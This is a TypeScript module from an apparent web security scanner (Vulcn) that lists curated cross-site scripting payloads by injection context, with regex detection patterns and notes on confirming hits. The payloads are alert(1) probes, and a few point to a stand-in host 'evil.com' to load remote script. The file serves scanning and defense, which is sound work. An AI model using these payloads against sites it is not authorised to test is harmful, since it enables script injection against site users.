/**
 * Curated XSS Payloads
 *
 * Hand-crafted, context-aware XSS payloads that cover the major
 * injection contexts seen in real-world applications:
 *
 *   1. Tag injection (HTML body scope)
 *   2. Attribute breakout (double/single quoted)
 *   3. Unquoted attribute injection
 *   4. JavaScript string/expression breakout
 *   5. Tag structure breakout
 *   6. Scriptless injection (form action, base href, script src)
 *
 * These are the DEFAULT payloads for Vulcn XSS scanning.
 * PayloadBox (PayloadsAllTheThings) can be enabled for
 * broader coverage via the `usePayloadBox` flag.
 */

import type { RuntimePayload } from "@vulcn/engine";

// Only TAG patterns are reliable for pattern matching in checkReflection:
// finding `<script>alert(` or `<img ...onerror=` in the DOM proves a new element
// was injected. EVENT patterns alone (onerror=, onmouseover=) can match the
// payload's own text reflected as harmless body text or inside a quoted
// attribute. For event-handler payloads, only dialog detection (alert() fires)
// provides reliable confirmation.

const TAG_PATTERNS: RegExp[] = [
  /<script[^>]*>alert\(/i,
  /<svg[^>]*onload\s*=/i,
  /<img[^>]*onerror\s*=/i,
  /<input[^>]*onfocus\s*=/i,
  /<details[^>]*ontoggle\s*=/i,
  /<body[^>]*onload\s*=/i,
];

// JS context and scriptless payloads should NOT use pattern-based detection.
// Their payload text contains `alert(1)` literally, so the pattern always
// matches — even when the payload is safely reflected as text inside a quoted
// attribute. Detection for these contexts relies exclusively on the
// detect-xss plugin's dialog hook (alert() actually executing).
// We keep this as an empty array for documentation purposes.
const JS_PATTERNS: RegExp[] = [];

// ── Payload sets ────────────────────────────────────────────────

/**
 * 1. Tag injection — payload lands in HTML body scope.
 *    The most common and straightforward XSS context.
 *    Injects entirely new HTML elements with script execution.
 */
const tagInjection: RuntimePayload = {
  name: "xss-tag-injection",
  category: "xss",
  description: "Tag injection — new elements in HTML body scope",
  source: "curated",
  detectPatterns: TAG_PATTERNS,
  payloads: [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src onloadstart=alert(1)>",
    "<marquee onstart=alert(1)>",
  ],
};

/**
 * 2. Attribute breakout — payload is inside a quoted attribute.
 *    e.g.  <input value="PAYLOAD">  or  <img src="PAYLOAD">
 *
 *    Strategy: close the quote, add an event handler, balance the quote.
 */
const attributeBreakout: RuntimePayload = {
  name: "xss-attribute-breakout",
  category: "xss",
  description: "Attribute breakout — escape quoted attribute context",
  source: "curated",
  detectPatterns: TAG_PATTERNS,
  payloads: [
    // Double-quote breakout → event handler
    '" onmouseover=alert(1) x="',
    '" onfocus=alert(1) autofocus="',
    '" onerror=alert(1) src=x "',
    '" onclick=alert(1) x="',
    '" onload=alert(1) x="',
    // Double-quote breakout → new tag
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    // Single-quote breakout → event handler
    "' onmouseover=alert(1) x='",
    "' onfocus=alert(1) autofocus='",
    "' onerror=alert(1) src=x '",
    // Single-quote breakout → new tag
    "'><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
  ],
};

/**
 * 3. Unquoted attribute — payload is in an unquoted attribute value.
 *    e.g.  <script id=PAYLOAD>  or  <img src=PAYLOAD>
 *
 *    Strategy: space breaks the attribute, then inject event handler.
 */
const unquotedAttribute: RuntimePayload = {
  name: "xss-unquoted-attr",
  category: "xss",
  description: "Unquoted attribute — space to inject new attributes",
  source: "curated",
  detectPatterns: [],
  payloads: [
    "x onmouseover=alert(1)",
    "x onfocus=alert(1) autofocus",
    "x onerror=alert(1)",
    "x onload=alert(1)",
    "x onclick=alert(1)",
    "x style=animation-name:x onanimationstart=alert(1)",
  ],
};

/**
 * 4. JavaScript context — payload is inside a JS string or expression.
 *    e.g.  onclick="var x='PAYLOAD'"  or  <script>var x="PAYLOAD"</script>
 *
 *    Strategy: close the string delimiter, inject JS statement.
 */
const jsContext: RuntimePayload = {
  name: "xss-js-context",
  category: "xss",
  description: "JavaScript context — break out of JS strings/expressions",
  source: "curated",
  detectPatterns: JS_PATTERNS,
  payloads: [
    // Double-quoted JS string breakout
    '";alert(1)//',
    '"-alert(1)-"',
    '";alert(1);"',
    // Single-quoted JS string breakout
    "';alert(1)//",
    "'-alert(1)-'",
    "';alert(1);'",
    // No-quote / numeric context
    ";alert(1)//",
    ";alert(1);",
    "1;alert(1)",
    "1);alert(1)//",
    // Template literal breakout
    "${alert(1)}",
    "`-alert(1)-`",
  ],
};

/**
 * 5. Tag structure breakout — payload is in a tag attribute or
 *    child element, need to close the current tag first.
 *    e.g.  <textarea>PAYLOAD</textarea>  or  <!-- PAYLOAD -->
 */
const tagStructure: RuntimePayload = {
  name: "xss-tag-structure",
  category: "xss",
  description: "Tag structure breakout — close current tag, inject new one",
  source: "curated",
  detectPatterns: TAG_PATTERNS,
  payloads: [
    "></script><script>alert(1)</script>",
    "><img src=x onerror=alert(1)>",
    "><svg onload=alert(1)>",
    "><input onfocus=alert(1) autofocus>",
    "</textarea><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "--><script>alert(1)</script>",
  ],
};

/**
 * 6. Scriptless injection — payload exploits non-script attributes
 *    (form action, base href, script src, meta refresh).
 */
const scriptless: RuntimePayload = {
  name: "xss-scriptless",
  category: "xss",
  description:
    "Scriptless injection — form action, base href, script src, data URIs",
  source: "curated",
  detectPatterns: [],
  payloads: [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "//evil.com/",
    "https://evil.com/",
    "//evil.com/xss.js",
    "data:,alert(1)",
  ],
};

// ── Public API ──────────────────────────────────────────────────

/**
 * All curated XSS payload sets.
 * Ordered from most common to most specialized context.
 */
export const CURATED_XSS: RuntimePayload[] = [
  tagInjection,
  attributeBreakout,
  unquotedAttribute,
  jsContext,
  tagStructure,
  scriptless,
];

/**
 * Total number of curated XSS payloads across all sets.
 */
export const CURATED_XSS_COUNT = CURATED_XSS.reduce(
  (sum, set) => sum + set.payloads.length,
  0,
);
